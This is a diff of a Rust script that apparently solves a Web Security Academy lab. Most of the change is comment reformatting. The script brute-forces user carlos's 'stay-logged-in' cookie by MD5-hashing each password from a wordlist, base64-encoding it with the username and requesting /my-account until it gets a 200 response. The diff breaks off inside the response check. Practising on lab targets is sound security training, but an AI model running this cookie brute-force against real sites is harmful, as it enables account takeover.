@@ -32,28 +32,43 @@ use text_colorizer::Colorize;
 **********************/
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn error::Error>> {
-    let url = "https://0a4000dd04fa45f98333d3230000007a.web-security-academy.net"; // change this to url of your labs
-    let passwords = fs::read_to_string("/home/ahmed/passwords")?; // change the path to passwords list
-    let client = build_client();
+    // change this to your lab URL
+    let url = "https://0a4000dd04fa45f98333d3230000007a.web-security-academy.net"; 
 
-    let start_time = time::Instant::now(); // capture the time before brute forcing
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+    
+    // read passwords to one big string
+    // change the path to passwords list
+    let passwords = fs::read_to_string("/home/ahmed/passwords")?; 
+
+    // capture the time before brute forcing
+    let start_time = time::Instant::now(); 
+    
     println!(
         "{} {}..",
         "[#] Brute frocing password of".white().bold(),
         "carlos".green().bold()
     );
+    
+    // iterate over the list
     for password in passwords.lines() {
-        // iterate over the list
-        let password_hash = format!("{:x}", md5::compute(password)); // compute the md5 hash of password
+        // compute the md5 hash of password
+        let password_hash = format!("{:x}", md5::compute(password)); 
+        
+        // encrypt the hash with the username (base64)
         let cookie_encrypted = base64::engine::general_purpose::STANDARD_NO_PAD
-            .encode(format!("carlos:{password_hash}")); // encrypt the hash with the username (base64)
+            .encode(format!("carlos:{password_hash}")); 
+        
+        // try to GET /my-account with the modified cookie
         let get_res = client
             .get(format!("{url}/my-account"))
             .header("Cookie", format!("stay-logged-in={cookie_encrypted}"))
             .send()
-            .await?; // try to GET /my-account with the modified cookie
+            .await?; 
 
-        match get_res.status().as_u16() { // check the response status code
+        // check the response status code
+        match get_res.status().as_u16() { 
             200 => {
                 // if you successfully logged in
                 println!(
